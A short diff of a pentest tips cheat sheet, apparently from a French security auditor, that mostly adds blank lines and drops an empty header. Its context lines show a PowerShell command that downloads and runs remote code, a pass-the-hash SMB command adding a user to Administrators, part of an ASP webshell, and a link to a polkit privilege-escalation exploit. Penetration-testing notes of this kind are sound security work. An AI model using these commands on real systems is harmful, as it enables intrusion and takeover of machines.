@@ -2,6 +2,8 @@
 
 Some tips from a cybersecurity auditor & consultant in France.
 
+
+
 ## Pentest Active Directory
 
 ### AD Mapping
@@ -114,6 +116,8 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
 ```
 
+
+
 ## Pentest Web
 
 ### Webshell
@@ -129,6 +133,8 @@ Response.write(o)
 Response.write("</pre>")
 %>
 ```
+
+
 
 ## Bruteforce
 
@@ -174,8 +180,6 @@ CVE-2021-3560
 ```markdown
 https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
 ```
-
-### Windows
 
 ### Web
 Read PHP Code with PHP Filter :
